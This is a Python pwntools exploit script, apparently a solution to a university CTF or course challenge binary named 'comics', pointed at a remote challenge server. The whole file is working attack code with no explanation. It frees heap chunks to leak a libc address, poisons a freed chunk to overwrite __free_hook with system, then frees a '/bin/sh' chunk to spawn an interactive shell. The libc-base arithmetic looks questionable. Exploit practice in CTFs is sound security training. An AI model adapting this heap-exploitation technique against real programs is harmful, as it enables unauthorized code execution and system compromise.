from pwn import *

binary_path = './comics'
e = ELF(binary_path)
host, port = "offsec-chalbroker.osiris.cyber.nyu.edu", 1214
libc = ELF('libc.so.6')
context.binary = binary_path
use_local = False
use_gdb = False

main_arena_offset = 0x1687c0
puts_libc_offset = libc.symbols['puts']
free_hook_libc_offset = libc.symbols['__free_hook']
system_libc_offset = libc.symbols['system']

if use_local:
    p = process(binary_path)
elif use_gdb:
    p = gdb.debug(binary_path, gdbscript='''b main\nc\n''')
else:
    p = remote(host, port)
    p.sendline("vc2499")

def add_entry(size, content):
    p.sendlineafter(b"option?", b"1")
    p.sendlineafter(b"to be?", content[:size])

def remove_entry(index):
    p.sendlineafter(b"Please select an option?", b"4")
    p.sendlineafter(b"What comic number would you like to delete?", str(index).encode())

def modify_entry(index, content):
    p.sendline(b"3")
    p.sendlineafter(b"edit?", str(index).encode())
    p.sendlineafter(b"Enter a new punchline!", content)

def view_entry(index):
    p.sendlineafter(b"option?", b"2")
    p.sendlineafter(b"display?", str(index).encode())
    response = p.recvuntil(b"Please select an option?")
    match = re.search(rb'\xe0[\x00-\xff]{5}', response)
    if match:
        leaked = u64(match.group(0).ljust(8, b"\x00"))
        log.info(f"Leaked address: {hex(leaked)}")
        return leaked
    return None

add_entry(0x500, b"A" * 1)
add_entry(0x500, b"B" * 1076)
add_entry(0x100, b"C" * 3)

remove_entry(0)
remove_entry(1)
remove_entry(2)

leaked_address = view_entry(1)

if leaked_address:
    libc_base = leaked_address - main_arena_offset - puts_libc_offset
    free_hook_addr = libc_base + free_hook_libc_offset
    system_addr = libc_base + system_libc_offset

    log.info(f"Libc base: {hex(libc_base)}")
    log.info(f"__free_hook: {hex(free_hook_addr)}")
    log.info(f"system: {hex(system_addr)}")

    modify_entry(2, p64(free_hook_addr))
    add_entry(0x100, b"/bin/sh\x00")
    add_entry(0x100, p64(system_addr))

    p.sendlineafter(b"Please select an option?", b"2")
    p.sendlineafter(b"What comic number would you like to display?", b"2")
    remove_entry(3)

    p.interactive()
else:
    log.error("Failed to leak a valid address.")
    p.close()
